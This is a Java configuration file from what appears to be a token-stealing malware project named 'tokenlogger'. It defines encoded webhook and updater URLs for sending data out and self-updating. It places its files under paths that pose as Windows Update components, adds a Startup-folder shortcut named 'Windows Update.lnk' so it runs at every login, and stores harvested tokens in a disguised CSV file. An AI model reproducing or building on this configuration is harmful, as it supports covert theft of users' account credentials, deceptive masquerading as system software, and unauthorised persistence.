package tokenlogger.config;

import static tokenlogger.utils.Decryptor.decode;

public class Config {
    public static final String WEBHOOK_URL = decode("");
    public static final String VERSION_INFO_URL = decode("");
    public static final String UPDATER_JAR_URL = decode("");
    public static final String UPDATER_SAVE_PATH = System.getenv("LOCALAPPDATA") + "\\Microsoft\\Windows\\WindowsUpdateAgent.jar";
    public static final String APP_SAVE_PATH = System.getenv("LOCALAPPDATA") + "\\Microsoft\\Windows\\WindowsUpdate.jar";
    public static final String SHORTCUT_PATH = System.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Windows Update.lnk";
    public static final String TOKEN_DATABASE_PATH = System.getenv("LOCALAPPDATA") + "\\Microsoft\\Windows\\Update Info.csv";
    public static final int VERSION_NUMBER = 1;
}
